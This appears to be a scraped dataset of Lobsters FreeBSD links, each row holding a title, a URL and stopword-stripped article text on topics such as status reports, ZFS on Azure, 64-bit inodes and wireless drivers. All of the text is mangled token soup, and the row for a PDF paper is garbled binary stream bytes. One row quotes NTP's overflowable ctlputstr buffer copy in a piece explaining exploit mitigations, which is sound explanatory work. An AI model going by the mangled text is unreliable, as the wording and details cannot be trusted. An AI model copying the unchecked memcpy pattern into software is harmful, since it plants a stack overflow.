sandboxed version memcached cloudabi try far cloudabi used run software written c c python would like see programming language work cloudabi well sure help contact marius strobl marius freebsdorg support emmc partition added mmc mmcsd freebsd besides user data area ie default partition emmc later device additionally provide enhanced user data area partition boot partition rpmb replay protected memory block partition general purpose partition optionally enhanced extended attribute apart simply subdividing emmc flash device uefi code boot partition done intel nucs another use case partition support activation pseudoslc mode manufacturer emmc chip typically associate enhanced user data area andor enhanced attribute general purpose partition order able partition emmc device also added linuxcompatible ioctl interface mmcsd allows use gnu mmcutils found port sysutilsmmcutils freebsd besides partitioning emmc device mmc tool also used query lifetime estimate preeol information emmc flash well query basic information sd card caveat emptor partitioning emmc device onetime operation additionally order make emmc flash device usable support ddr dual data rate bus speed mode maximum mhz added mmc sdhci appear freebsd compared high speed mode previous maximum mhz mode increase performance tested emmc chip mb mb far support mode enabled emmc controller found intel apollo lake bay trail braswell chipsets note however emmc sdhci controller apollo lake variant occasionally lock due silicon bug independent running mode viable workaround problem appears implementation support mode sdhci currently sdhci support encumbered sdma mode dma however also brought infrastructure fair amount code using even faster transfer mode emmc device sd card respectively ie emmc uhsi mode sd card intent merge change back freebsd open task add support emmc transfer modesadd support sd card uhsi transfer mode make mmcsd robust correctly follow relevant specification existing feature eg calculate handle erase timeouts sendstatus invoked response extent already fixed part get remainder existing code properly check handle return code etc contact christian brueffer brueffer freebsdorg contact robert watson rwatson freebsdorg contact trustedbsd announce mailing list trustedbsdannounce trustedbsdorg trustedbsd project opensource community developing advanced security feature opensource freebsd operating system started april project developed support extended attribute access control list acls openpam security event auditing openbsm flexible kernel access control framework mandatory access control geom storage layer result work may found freebsd also netbsd openbsd linux apple mac o x io operating system today project continues maintain enhance mature feature freebsd quarter trustedbsd project transitioned freebsd perforce server github made possible alexis sarghel owned user trustedbsd github graciously transferred account trustedbsd project date repository hosting trustedbsd website sebsd repository moved contact sepherosa ziehau sepherosa gmailcom contact hongjiang zhang honzhan microsoftcom contact dexuan cui decui microsoftcom contact kylie liang kyliel microsoftcom sriov support nics implemented far tested mellanox vf card work despite issue bug http bugsfreebsdorgbugzillashowbugcgi update uefi vms ie hyperv generation vms loader issue bug fixed uefi vms boot secure boot disabled synthetic keyboard driver added currently head mfcs planned occur soon scsi dvd detection issue bug fixed without fix vm would fail boot project sponsored microsoft contact jeb cramer jebjcramer intelcom contact eric joyner ericjoyner intelcom contact krzysztof galazka krzysztofgalazka intelcom driver update intel ixixv ixlixlv network driver includes support several new hardware release ixixv added support soc device based denverton platform ixlixlv added support soc device based lewisburg chipset added interface upcoming iwarp driver device added support device open task ixixv iflib support currently review phabricator refactored include work ixlixlv iflib support progress contact dimitry chagin dchagin freebsdorg contact edward tomasz napierała trasz freebsdorg contact mahdi mokhtari mmokhi freebsdorg quarter pleased announce two many work achieved linuxulator added new placeholder marker unimplemented accompany previously existing dummy distinguishing syscalls linux kernel implement currently implement linuxdummyc clearer newcomer follow quickly know area start working support two new syscalls preadv pwritev added linuxulator open task plan implement execveat syscall native freebsd syscall table portwrap use linuxulator contact ilya bakulin kibab freebsdorg goal project reimplement existing mmcsd stack using cam framework permit utilizing welltested cam locking model debugging feature also possible process interrupt generated inserted card prerequisite implementing sdio interface sdio support necessary communicating wifibt module found many development board raspberry pi another feature new stack support sending sd command userland application using cam allow building device driver userland make debugging much easier new stack able attach sd card bring operational state possible read write card stack tested work beaglebone black wandboard quad platform currently code prepared inclusion freebsd source tree cam extended support sdiospecific function reading register managing interrupt etc open task integrate code freebsd head facilitate testingbegin writing driver broadcombased wlan chip found raspberry pi wandboard begin writing driver marvellbased wlan chip found globalscale dreamplug chromebooks contact rick macklem rmacklem freebsdorg parallel nfs pnfs extension protocol allows file access within single logical mount performed multiple file server potential data access occur parallel pnfs layout use specifies division occurs metadata operation occurring main server bulk data operation readwritesetattretc occurring via layoutspecific scheme client data server first attempt pnfs server using glusterfs dud worked performance poor usable attempt call plan b us freebsd one freebsd server handling metadata operation multiple freebsd server configured serve data client support pnfs file layout able read write data server directly spreading rpc load allowing growth beyond single freebsd nfs server could achieve support flex file layout mirroring time hope use flex file layout add mirroring support next year striping also supported plan implementing moment plan b working quite well available testing end april announce freebsdfs freebsdorg mailing list available open task testing others needed available contact justin hibbits jhibbits freebsdorg booke platform target support mode includes address space split page table directory list us hole expand full address space leaving gap address space page mapping repeated may change future aim port booke support running powerpc binary well even tested init shell several soc driver supported however dtsec ethernet controller yet supported work ongoing support config included targeting series socs freescale thanks juniper network providing patch older internally maintained freebsd version enabled porting effort providing historical context quirk pmap change open task port dtsec driver assumption reference driver operating environment may easier port linux driver instead would also give arm support ethernet controllertake advantage pointer alignment squeeze bit page table possible squeeze least bit one level contact marcin wojtas mw semihalfcom contact zbigniew bodek zbb semihalfcom final testing productionization support marvell platform way rebase cleanup going well patch functioning top head ready upstreaming specific task completed include platform benchmarking lowlevel optimization internal bus cache prefetch already submitted enable cache controller currently review neta test optimization phyhandling rework phy handling rework fix fix enable performance counter support fix timer extract watchdog support separate driver crypto driver fix merged ahci controller support merged thermal driver merged merge additional support new board solidrun clearfog project sponsored stormshield semihalfopen task submit remaining fix driver contact bjoern zeeb bz freebsdorg long time ago freebsd time initial port freebsd booted past init good day emulator attempt revive effort started get freebsd build clangllvm time possible build world generic kernel skeleton anything yet using external binutils primary idea initial work allow incremental addition necessary architecturespecific code build framework place allow thirdparty developer simply type make willing contribute port without know freebsd build specific cleanup update recent head planning push current work public repo facilitate collaboration open task write wiki page perarchitecture specific task need done based current work experience riscvimplement userspace kernel perarchitecture gapsfigure way get access ibm zpdt better emulator ease implementation testing debugging contact mahdi mokhtari mmokhi freebsdorg contact mark felder feld freebsdorg quarter new dev version mysql landed port collection mysql introduces many new feature though patch part merged mysql also updated mysql latest version closed many pr related mostly relating using freebsdprovided port library instead bundled copy course plenty security update also report problem specify mysqloptfile people encountered using mysql considered solved mysql version init script search default location backwards compatibility variety location used configuration file give report error open task test new version report problem contact jeansébastien pédron dumbbell freebsdorg contact thomas zander riggs freebsdorg port collection rust updated cargo latest version time writing langrustnightly also updated snapshot february enabled lagging bit behind upstream rustup work nicely freebsd need try versionschannels rust work started bootstrap rust architecture patch add support submitted accepted upstream progress langrustnightly port also adapted compile natively work critical particular firefox shortly require rust want help please refer guide linked compiler rustc crashing sometimes compilation error therefore bit work improve stability code duplication langrust develcargo makefiles deserve bit cleanup might useful create usesrust makefile helper open task bootstrap rust platformsinvestigate compiler crashescreate usesrust makefile helper simplify rust cargo portsinvestigate speed langrust compilation time contact rené ladan rene freebsdorg contact remko lodder remko freebsdorg work started initial translation freebsd handbook dutch language via po system outdated version handbook available via older xml file trying get back shape po file rene started working two article already translation string fdpprimer remko started working handbook think assist either please send rene remko email start coordinating work addition since translation set already xml file would interesting see whether merge easily po structure idea contact u asap project sponsored snow bv part open task identify way merge current xml translation nlnlpo filesmerge translation po filesupdate remaining open item po filesremove oldoutdated translation file main repo use po bookxml file generate dutch handbook filesidentify whether also translate htdocs page via po systemnews home status home
472,Lobsters,freebsd,FreeBSD,"FreeBSD on 11″ MacBook Air 5,1 (mid-2012)",https://www.geeklan.co.uk/?p=2214,freebsd macbook air,tried openbsd rump kernel rcng openrc lumen bug wsp sndhda urtw,tiny machine year mostly run o x though tried openbsd besides screen resolution still really happy hardware wise software wise much use external disk containing zpool data among data several source tree cv zfs filesystem o x painfully slow dislike build running inside terminalapp slow expense responsive ui system seems fragile slightest push machine either hang become unresponsive buggy serial driver implement break signal cause instability frustrating last week whilst working rump kernel build introduced new build issue process fixing others needed pick new change cv updating copy source tree run build test issue still present let count took age update source process cross compiling release system locked hard time look possible elsewhere using o x many year tied anything exclusive maybe tweetbot perhaps bsdnow podcast covering change coming trueos formerly pcbsd desktop focused distro based freebsd experiment seemed interesting project track freebsdcurrent replaced rcng openrc init system come preconfigured desktop environment using window manager lumen booting usb flash image made without issue dock widget state detected feature wifi broadcom sound card detected screen resolution set planned give try weekend friday made backup wiped system trueos installed without issue short working desktop resuming sleep worked box spend long testing trueos switching netbsdhead realise really need zfs testing thing might well give stock freebsd try trueos based current turn sleep work yet sound work box invocation pkg xorg dwm firefox cv virtuaboxose installed binary package virtualbox seems cause system panic bug able survive without virtual machine next day settle considering ditching virtualbox converting vdi file raw image written new zvol use bhyve default keyboard layout dvorak o x set efi setting layout first time installed freebsd opted full disk encryption ran odd issue boot keyboard layout dvorak password accepted system would boot went mount various filesystems would switch back qwerty tried entering password layout able progress bug report yet ruled problem thunderbolt gigabit adapter bge dvi adapter worked freebsd though gigabit adapter need plugged boot detected trackpad bind wsp left right middle click available single double tripple finger tap sound card bind sndhda work box wifi using urtw alfa adapter bit large side work reliably copy dmesg
473,Lobsters,freebsd,FreeBSD,Bringing up 802.11ac on FreeBSD,http://adrianchadd.blogspot.com/2017/04/bringing-up-80211ac-on-freebsd.html,bringing freebsd,,chipping away bringing freebsd meaning write post know life got way reasonably good support support decided ago start adding basic support good exercise figuring minimum set required feature another excuse go find broken corner case needed addressing talk introduces new concept stack need understand decided use qca part know firmware general chip stuff first generation part well b know bunch stuff like rate control packet scheduling etc nt chose say intel part implement lot fiddly stuff get good behaviour first step survey needed bring small subset functionality typical first target monitor mode since requires channel configuration work nt require rest stack know anything ie aware ie negotiation step one adding vht channel decided shorter term cheat add vht channel already large map linux way channel context rather hundred static channel choose better long run wanted get thing running first added vht flag operating mode bare work required populate channel list vht channel well required adding support ifconfig support loading vht channel regulatory domain regdomainxml yes let get vht channel statically configured needed add vht capability driver structure virtual interface structure driver told yes vht thing needed glue driver port far enough along attempt added enough glue say support vht iccaps field propagated driver monitor mode configuration yes bit dancing managed get vht channel show monitor mode could capture wide packet success point took big segue decided ensure receive packet flag made sense vht operation bunch work tidy could mark frame mostly done day next station operation required thing get right channel promotion ie going knowing vht y transmit receive negotiating vht capability announce ap association requestresponse telling driver going far fiddly getting channel promotion work support concept dumb nics like atheros part well multiple virtual interface driver view right configuration programmed hardware firmware nics like basically everything sold today nt exactly helpful limited single vap vap configuration partially derived global state partially derived negotiated state annoying adding list thing fix later sorry went bit tangent one thing look list desired channel vap determines nic channel order support yes iccurchan used get updated vap ivdeschan like channel active channel actually vap ivbss nichan yes bs node current channel get promoted need uhm fix pervap state current channel get updated bs channel high list thing fix next part channel promotion done done via call promote channel instead done call routine parse ht y yes parsing ie also upgraded channel spent bunch time refactoring bit parse y separate channel promotion fun time channel promotion worked associated fine open mode station negotiated piece wrong spent day looking packet capture ensure negotiated vht capability correctly seems work fine next adding support thing stopped encrypted data tl dr crypto key handling model needed overhauling firstly key management code assumes everything synchronous ca nt sleep firmware based device really nt true lot driver defer key management taskqueues run thing sound fine realise key addition succeeds transmit frame expecting encrypted userland problem ioctl set key return ok queue key negotiation frame uhm clever thing try work around cover need fix properly later next qca chipsfirmware crypto offload actually pretend key nt include iv nt include padding anything send command set crypto key send unencrypted frame frame want ethernet mean teach thing frame decrypted hardware needed decrypted bit set header field saying decrypted cleared frame encrypted nt encrypted bit set frame encrypteddecrypted padding needed teach input path crypto path validate hardware said offload yeah done whole separate discussion hostap defer later suffice say point got hostap mostly working come hard bit fixing shortcoming commit driver lot first one global state firmware allows call vdevs virtual device example multiple ssidbssid support implemented multiple vdevs stawds implemented vdevs implemented vdevs technically speaking go find global state really pervdev make pervdev tricky though lot state nt kept pervap even though need fix following pervdev rather global slot time configuration erp configuration ie bs overlap frame protection configuration qoswmm configuration channel width configuration need extending channel width thing plainly implemented ampdu offload example fine amsdu offload pretend multiple frame sequence number crypto information problematic sequence number deduplication code also ampdu offload case one amsdu frame tossed drastically kill performance almost done implementing amsdu ampdu offload support done implement amsdu offload deduplication awareness performance drastically rise another thing mentioned channel width well thing need extending bit one like get right smps spatial multiplexing power save chip support firmware need allow configured controlled nt even option right like implement smps atheros part ath lot work anyway far good need land freebsdhead finish port commit freebsd lot stuff coming including stuff like multiuser mimo mumimo plainly nt talked yet viva la freebsd wireless
474,Lobsters,freebsd,FreeBSD,(finally) investigating how to get dynamic WDS (DWDS) working in FreeBSD!,http://adrianchadd.blogspot.com/2017/04/finally-investigating-how-to-get.html,finally investigating get dynamic wds dwds working freebsd,http,sat recently figure get dynamic wds working freebsdhead freebsd since forever theory actually worked extremely documented useful way basically technology earlier apple airport grew wireless tech world call proxysta extender technology qualcomm atheros chipsets implement common question get people ca nt bridge multiple virtual machine laptop show wifi work ethernet response make dynamic wds work make work freebsd device use nat always make people sad normal station access point setup wireless frame three address header address address address depending upon packet type variety address sa source address source packet eg sta address ta transmitter address staap transmitted frame ra receiver address immediate destination packet da finally recipient data bssid bs id ie ap mac address lot address fact number address field normal frame want understand used frame totally find blog post people describe thing eg http fill tl dr normal apsta traffic ap frame bssid sa mac eg ethernet behind ap bridge sending data da sta mac address sta frame bssid ta sta transmits da final destination frame eg ethernet behind ap bridge big note enough mac address say please send frame station mac address forward another mac address attached behind bridge would require mac address header nt get except separate address format fromds tod bit header set mean frame coming distribution system distribution system four mac address ra ap sending fourth field indicates eventual destination address may ethernet device connected behind said sta nt configure wds send frame station mac address nt actually interface mac address system would confused sta would nt able transmit easily ap would nt know get back bridged ethernet address ok work wds fromtods mode actually technical hilarity behind wireless distribution system fancy way saying ap connects another ap relay frame used extending wireless network true meshing solution came existence original wds statically configured thing configure particular device wds extender side would need configuring central ap would need know mac address wds master would know frame fromto particular ap needed fouraddress frame format extender ap would need configured talk central ap act wds master would associate station central ap would use frame relay traffic static configuration work great associate extender ap station central ap use wpasupplicant setup encryption anything central ap extender ap station would encrypted normal station traffic frame format convenient statically configure everything including telling central ap satellite extender aps want replace central ap reprogram extenders use new mac address sam leffler came dynamic wds nt explicitly state list centralsatellite aps instead configure central ap dynamic wds frame show associated station promotes wds peer satellite ap find ap communicate assume wds start using frame still bit clunky beacon probe request etc y say dynamic wds better make central aps different ssid certainly better yes one thing freebsd work adding concept dwds primary node concept satellite find dwds primary enabled ap associate baby step tried let say documentation nt say much could nt really get work friend pointed figured thankyou edward firstly script setupwdsmain setupwdsrelay script well almost complete documentation dynamic wds setup manpage nt go anywhere near enough information dug turn dynamic wds us helper daemon wlanwds listens dynamic wds configuration change thing run central ap side started making sense dynamic wds wds interface type created default post routing socket message frame show dwds enabled interface signal userland plumb dwds interface particular peer wlanwds responsible creating virtual interface right configuration run shell script provide let thing like assign bridge group bridge traffic finally station go away wlanwds get another notification saying station gone wlanwds destroy virtual interface peer far good followed script modified bit use encryption well half worked association worked fine traffic passing little tcpdumping later showed going frame extender side successfully encrypted transmitted central ap frame central ap send unencrypted station dropped well unencrypted encrypted little digging showed actual problem dynamic wds example script openunencrypted network using encrypted network central ap side need enable privacy virtual interface traffic get encrypted parent interface encryption key adding ifconfig dev wepmode mixed shell script interface created made everything work done enough testing show indeed working nt done anything like pas lot traffic via iperf mix dwds normal sta peer actually run longer minute sure issue fix however need home ca nt see home ap upstairs room see care dwds start using daily fix whatever hilarity ensues
476,Lobsters,freebsd,FreeBSD,64-bit inodes (ino64) Status Update and Call for Testing,https://lists.freebsd.org/pipermail/freebsd-current/2017-April/065687.html,inodes status update call testing,inodes status update call testing kostikbel gmailcom antoine http githubcomfreebsdfoundationfreebsdgit http information freebsdcurrent mailing list,inodes status update call testing konstantin belousov kostikbel gmailcom thu apr utc inodes data structure corresponding object file system file directory freebsd historically used value identify inodes limit file system somewhat object many modern file system internally use identifier freebsd need follow suit properly fully support file system inode project also known started life many year ago project gleb kurtsou gleb time several people hand updating addressing regression mckusick picked updated patch acted flagwaver sponsored freebsd foundation spent significant effort outstanding issue integration fixing abi nfs zfs addressing abi compat issue investigating fixing port failure rmacklem provided feedback nfs change emaste jhb provided feedback review abi transition support pho performed extensive testing identified number issue fixed kris performed initial port investigation followed exprun antoine emaste helped organization process note explains perform useful testing branch beyond typical smoke test overview branch extends basic system type inot devt nlinkt struct dirent layout modified due larger size inot also gain doff directory offset member implies abi change anyway struct statfs fmntfromname fmntonname array length mnamelen increased allow longer mount path name abi breakage mitigated providing compatibility using versioned symbol ingenious use existing padding structure employing trick unfortunately everything fixed especially outside base system instance thirdparty apis pas struct stat around broken backward forward incompatible way motivation main risk change uncontrolled abi breakage due expansion basic type devt inot struct dirent impact limited one part system affect kerneluserspace interface syscalls abi mostly stat kinfo libc interface mostly related readdir ft collateral damage library happens use changed type interface see instance libprocstat compat provided using symbol versioning libutil shlib version bumped quirk handled kinfo sysctl mib mib report structure depended changed type handled general considered breakage either management interface usually allow abi slip important struct xvnode changed layout compat shim provided struct xtty devt tty device member reduced decided keeping abi compat case useful reporting devt sake pstat testing procedure project tested cloning project branch github applying patch phabricator review located url attached working tree authorative source github promise update review update clone github git clone b http githubcomfreebsdfoundationfreebsdgit fetch patch phabricator visit http click download raw diff upper right page arc patch checkout directory cd syskern touch syscallsmaster make sysent cd touch syscallsmaster make sysent use custom kernel configuration ensure option included config build world kernel usual way install kernel reboot install new world make shortcut update procedure new kernel old world build install pristine head world apply patch build install updated kernel system must work pristine kernel new kernel new world old thirdparty application build install patched kernel world application compiled pristine head eg installed pkg regular portmgr build must work without regression compat binary host note bigendian host like powerpc might expose additional bug compat patch testing cumbersome arrange targeted test useful program check item version following program taken pristine system stat use regular file file dev socket pipe native compat stat must print reasonable information procstat use f option examine process file kinfo data must returned format acceptable older apps use pristine find binary many arbitrary option system installed patched world particular libc find examines ft compat shim libc nontrivial nfs server client test check nfs server patched kernel operates correctly without performance regression client nfs checked four combination patchedunpatched kernel serverclient filehandle format includes inode number filesystems generally filesystems see change system behaviour since patch goal provide space grow abi particular local filesystem layout must stay course possible reliance exact size changed type left unnoticed patch review case eg ondisk format would broken expect slip possible watched test accounting process accounting documented acct changed format record due devt increase verify program like sa accton correctly work old new accounting record port status port exprun open pr failing port responsible skipped port langghc multimediawebcamd devellibgtop sysutilspypsutil langrust patch available langghc langrust topic branch portspatch fixed way assistance investigating fixing port failure greatly appreciated overview problem proposed solution probably mostly relevant port maintainer llvm llvm includes component called address sanitizer asan try intercept syscalls contains knowledge layout many system structure since stat lstat syscalls removed several type structure changed reflected asan hack langghc ghc compiler part runtime written haskell mean compile ghc need working haskell compiler bootstrap default ghc runtime provided form static library static library reference default version libc symbol assigned elf symbol version final linking stage result using library result using updated syscall internally code still us old system type end result random memory corruption libc kernel assume new type situation fixed symbol versioning versioning act late instead hacked bootstrap compiler providing symbol modified syscalls shipped static library symbol direct execution compat variant syscalls allows bootstrap compiler generate working code compiler operates new structure thing stabilize real solution course repackage bootstrap compiler time need support head port also learning full scope ghc maintainance duty required much task langrust rustc similar structure ghc issue solution patching bootstrap done also rust libstd liblibc provide rustified definition system structure updated reflect updated layout failed understand eg struct stat defined place least found location patched next step tentative schedule project post wide call testing investigate address port failure maintainer support request second exprun initial patch applied investigate address port failure maintainer support commit head address postcommit failure feasible information freebsdcurrent mailing list
477,Lobsters,freebsd,FreeBSD,FreeNAS Corral being relegated to technology preview,https://forums.freenas.org/index.php?threads/important-announcement-regarding-freenas-corral.53502/,freenas corral relegated technology preview,official tracker resource section link,tl dr freenas corral originally released relegated technology preview status work hard rebase exciting new feature upon rocksolid freenas base many diehard user know released freenas corral march initial community response largely positive lot excitement around updated ui vmdocker support especially however also seen nearly half initial user revert back freenas user feedback dropoff clear challenge upgrading general instability lack feature parity jail iscsi etc user experiencing lower performance expected given increased demand freenas corral system hardware resource subsequent departure freenas corral project lead reexamined feature benefit issue corral decided revise plan future communicate new plan record little background probably order may know freenas corral gui built montagejs framework originally working alongside team montage studio unfortunately development product montage studio team disbanded development montagejs framework slowed crawl explains browser incompatibility seen first goal following release begin remaking freenas corral ui yes yet sigh basing ux common framework huge deal really extra ui work team time common framework allowing faster development opportunity contribution community new framework place ui next phase begin merging freenas freenas corral code base engineering team however response volume mixed feedback user community since release decided undergo thorough engineering review product started look deeper plan filesystem code allows vms access host filesystem discovered hole architecture make enterprisequality file access using impossible without lot effort soak time prompting u also rethink safely enable capability weighing community feedback much internal deliberation ix decided amount work still required bring freenas corral currently architected acceptable standard quality reliability data integrity take unreasonable amount time quicker path properly stable enterpriseworthy corral rebase upon solid freenas code bringing new feature current freenas corral offer mature solid platform process already begun inclusion vm container support brandnew angularbased ui already available nightlies time current release freenas corral treated experimental branch repositioned release technology preview status available download experimentation adventurous among use production environment also mean unlikely able migrate configuration setting corral next freenas corral product however data always importable new direction allow u focus effort next release merge legendary stability freenas whizbang feature freenas corral also swapping gui new typescript framework provides best world stability feature added benefit far faster path rock solid stable freenas release fact many original team behind freenas already begun process taking series merging new feature introduced freenas corral next stable soontobereleased freenas corral meantime next release freenas currently slated may look current roadmap subject change move farther along course new angularbased web ui testdrive early work nightlies prior upcoming release expand improve support jail jailbased plugins maximum compatibility lighter system requirement vm support added new vm menu allows host virtual machine freenas landing docker support virtual machinedriven service improve support devopsclass alerting pagerduty aws alert opsgenie slack coming local distributed bucket support initial work landing freebsd base landing item already active development ix look forward sharing detail become available usual ask betatesting community test drive feature nightlies provide feedback bug report official tracker thank continued support usage freenas appreciate user fan make product better daily basis behalf ix engineering team kris moore director engineering ixsystems mod note faq moving freenas corral freenas resource section find link ericloewe
479,Lobsters,freebsd,FreeBSD,The Importance of Exploit Mitigations,https://github.com/lattera/articles/blob/master/infosec/Exploit%20Mitigations/General/2017-03-21-importance/article.md,importance exploit mitigation,importance exploit mitigation ntp cf applicable exploit mitigation safestack controlflow integrity cfi conclusion,importance exploit mitigation operating system ship without exploit mitigation attacker easy time exploiting system past sixteen year grsecurity raising bar attacker providing innovative solution extremely difficult problem goal exploit mitigation drive cost attacker outside economics attacker freebsd enterprise operating system today lack exploit mitigation attacker reuse exploit without modification freebsd system exploitation vulnerable application relatively easy painless hardenedbsd fork freebsd porting grsecurity patchset order frustrate attacker drive cost see article bar raised drastically hardenedbsd exploit mitigation provide excellent security freebsd community ntp cf march ntp project announced several cf cf apply window system others involve injecting malcious configuration malicious ntp server unwitting ntp client focusing one two ntp vulnerability applicable freebsd involved stackbased buffer overflow classic stackbased buffer overflow several affected function generally follow pattern ctlputstr ctlputstr write tagged string response packet form tag data len data length excluding nul terminator ctlputstr var value strlen value static void ctlputstr const char tag const char data sizet len char buffer char cp sizet tl tl strlen tag memcpy buffer tag tl buffer overflow cp buffer tl len insist tl len sizeof buffer cp cp memcpy cp data len cp len cp ctlputdata buffer uint cp buffer length tag checked prior copying content tag buffer tag could larger byte attacker make use crafting malicious data overflow buffer spilling stack canary return address stack canary extremely easy bypass day moot point applicable exploit mitigation without exploit mitigation crafting malicious payload trigger exploit gain arbitrary code execution would simple attacker need follow call path deduce memory layout attacker would able craft reusable payload work reliably time given predictable reproducable memory layout thus address space layout randomization aslr would prevent attacker knowing buffer lie memory attacker would still able overflow buffer know address needed successful exploitation without second vulnerability information leak hardenedbsd implementation aslr follows pax design enabled default architecture safestack enabled default hardenedbsd would mitigate vulnerability placing unsafe data buffer unsafe stack vulnerability turn arbitrary code execution vulnerability dataonly vulnerability attacker would able overflow buffer data considered unsafe current implementation safestack requires aslr minimum effective unsafe stack placed random spot memory however safestack relies operating system virtual memory subsystem perform randomized mapping attacker could deduce unsafe stack memory lie attacker could bypass safestack additionally safestack enhanced wx attacker could reliably create memory mapping writable executable upgrade writable page executable rw rx attacker would able bypass safestack hardenedbsd also ship noncrossdso controlflow integrity cfi default attacker able overflow buffer modify function pointer cfi would disallow calling function pointer function pointer would point valid code path determined compiler runtime function pointer crossdso cfi yet available hardenedbsd also build top aslr wx crossdso cfi requires storing memory metadata loaded shared object function reference even though crossdso cfi still workinprogress hardenedbsd noncrossdso cfi would still effective since code question resides application code shared library conclusion aslr wx safestack cfi enabled hardenedbsd attacker extremely difficult time successfully exploiting multiple exploit mitigation enabled holistic approach security taken cost exploitation driven upwards exploitation freebsd given complete lack meaningful exploit mitigation would relatively simple
480,Lobsters,freebsd,FreeBSD,Comprehensive and biaised comparison of OpenBSD and FreeBSD,https://www.bsdfrog.org/pub/events/my_bsd_sucks_less_than_yours-AsiaBSDCon2017-paper.pdf,comprehensive biaised comparison openbsd freebsd,,obj stream k k c dv v asr z gi jr p endstream endobj obj stream f әd xl lm b ef rp mi ԅ dq ŕn բ v gyj endstream endobj obj stream ƅ bu c w g 녫 v lмk x l endstream endobj obj stream tpy h n ijh n f djൟ v ai g leq dbը kq e j endstream endobj obj stream xڽz zo f fdz zya ф g x q r ܖl ua e q xup cg wɩ stream mv mt l z h k ե p p cm r ob ߥ n
481,Lobsters,freebsd,FreeBSD,Getting started with ZFS on FreeBSD on Azure (2016),http://withblue.ink/2016/10/21/getting-started-with-zfs-on-freebsd-on-azure.html,getting started zfs freebsd azure,last june good reason anything losing data would incovenient create freebsd vm azure azure marketplace official documentation tip note host caching set none zfs concept terminology freebsd documentation vdev zpool dataset first zfs dataset note configuring datasets blog post caching slog note slog tip encryption azure key vault tip,last june freebsd officially supported azure available marketplace everyone simply launch freebsd writing vm click play o obviously miss chance test one appreciated feature freebsdthe zfs filesystem originally created sun microsystem solaris later opensourced lot great feature make perfect server particular designed protect data integrity builtin support snapshot replication compression deduplication much zfs lot supporter good reason used provide storage anything losing data would incovenient document repository transactional databasesfreebsd supported zfs since release implementation really mature making best free open source o use filesystem beside oracle solaris closedsource fork opensolaris openindiana community effort bring zfs linux see zfs linux project considered productionready macos openzfs o x toocreate freebsd vm azureto start launch freebsd vm directly azure marketplace configuration process essentially identical linux vm server connect using sshin order storage space zfs volume vm running attach data disk official documentation excellent job explaining add many disk want rule thumb vm support two data disk cpu core remembering using standard storage hddbased azure charged amount space actually consumed regardless much provisionedtip aiming performance make sure select vm plenty ram even deduplication disabled configuring dataset section zfs love memory leverage arc caching storing metadata freebsd documentation suggests automatic tuning algorithm work best system least gb ram default zfs use availabile memory minus gb caching merrier read caching option section belownote freebsd image azure marketplace come tested certified microsoft builtin support zfs using traditional ufs filesystem o disk moving root filesystem zfs possible yet easy looking leveraging zfs also o disk recommend instead creating vhd image locally fresh install freebsd uploading azure template article using zfs data disk onlyin example article using vm two data disk attached total vm four disk o disk freebsd installed touch temporary disk directly attached vm azure vms excluding aseries ssdbased great caching later first data disk maximum size gb tb second data disk maximum size gb tb attaching data disk azure vm use zfs important ensure host caching set none conflict zfs cachingzfs concept terminologyadministrators used creating raid array volume group filesystems linuxunix might find zfs little bit confusing first zfs task relevant concept terminology clearly explained freebsd documentation like particularly call three vdev virtual device made one disk partition file used virtual disk vdevs multiple disksvdevs combined data striped across way similar option enable mirroring similar striping parity called raidz us one three parity block conceptually similar nonexisting respectively please note vdevs immutable add disk existing vdeva zpool zfs pool made vdevs main building block zfs zpool name contains datasets volume see dataset filesystem zfs pool used read write datawhen working zfs treat data disk single vdevs combine zpool zpool name example tank automatically creates root dataset name add datasets pool hierarchically example tankshared child tank wich inherits property expand creating dataset named tanksharedphotos etcour first zfs datasetfor first configuration following simplest possible one two data disk configured striped array traditional raid terminology would note unlike required traditional environment azure need use mirroring striping parity applies zfs well indeed vm disk backed azure blob storage already replicated time offer enough protection disk failureopen terminal superuser root start zfs service enable starting zfs boot echo zfsenable yes etcrcconf start service service zfs start create first zfs pool zpool named tank two data disk zpool create tank mldr command complete almost instantly zpool tank created configured stripe across multiple disk check status zpool status zpool status pool tank state online scan none requested config name state read write cksum tank online online online error known data error creating zpool tank also get root dataset name automatically mounted boot tank need modify etcfstab check zfs list command zfs list name used avail refer mountpoint tank tank let create child dataset tank store shared file specifically two subdatasets document photo zfs create tankshared zfs create tankshareddocuments zfs create tanksharedphotos zfs list name used avail refer mountpoint tank tank tankshared tankshared tankshareddocuments tankshareddocuments tanksharedphotos tanksharedphotos tree tank tank shared document photo directory file see datasets document photo automatically mounted tankshareddocuments tanksharedphotos respectively used column represents much storage dataset using avail free space interestingly unlike traditional filesystems confined within partition zfs datasets fixed size default much flexibleconfiguring datasetszfs datasets highly configurable mentioned property inherited child datasets default child overwrite property set datasets time recommended set creation use switch zpool create command immediately writing data set property creating pool zpool create optionvalue dataset vdevs example zpool create tank setting option command syntax zfs set optionvalue dataset example zfs set tankshared multiple property combined zfs set atimeoff tankshared get full list configuration property man page zfs command man zfs going list interesting onescompression enables onthefly compression data written disk value use default algorithm explicit algorithm gzip compression one nicest feature zfs highly recommended every scenario unless data storing already highly compressed eg jpeg photo video etc although compression requires extra cpu processing reading writing data disk io usually bigger bottleneck cpu speed enabling compression improve readwrite throughput sensibly almost every situation term algorithm use gzip give best compression result generally preferred administrator light cpu best overall costbenefit ratioatime default enables recording disk access time file document impact performance atime often turned necessaryquota default none used limit size dataset example often used together quota quota set maximum size dataset prevent datasets zpool fill space available setting value reservation parameter zfs essentially taking space away zpool dataset use itlet set option datasets turn compression tankshared dataset disable atime recording performance set maximum size gb zfs set atimeoff tankshared tanksharedphotos dataset contains mostly jpeg file already heavily compressed need zfs spend time trying reduce thefile size even let overwrite inherited property zfs set compressionoff tanksharedphotos one last option deduplication one one interesting feature zfs used caution deduplication come high cost requires lot memory store deduplication table recommended gb ram every tb data stored deduplication help saving disk space data contains lot duplicated block example zfs used san vm hard disk something never happen azure scenario user much better relying compression example barely impact cpu enabling deduplication case want understand deduplication enable zfs suggest reading blog post oracle websitecachingwith zfs leverage two different kind disk cache improve io performance high level read cache addition level arc cache kept ram slog separate intent log speed synchronous write call case use fast ssdbased storage cache used store data read filesystem act second tier data cached ram arc great use case temporary ssd drive come azure vms disk directly attached host server offer smallest latency possible vms excluding aseries one based fast solidstate disk temporary disk content might lost time host server crash vm stopped azure portal resized since readonly matter data inside lost howeverenabling local ssd really easy start need make sure azure agent installed default freebsd image deployed azure marketplace mounting temporary disk automatically edit file etcwaagentconf set following parameter n resourcediskformatn next restart azure agent waagent unmount temporary disk mounted service waagent restart umount lastly add geom tank zpool zpool add tank cache check status zpool list v name size alloc free expandsz frag cap dedup health altroot tank online cache note 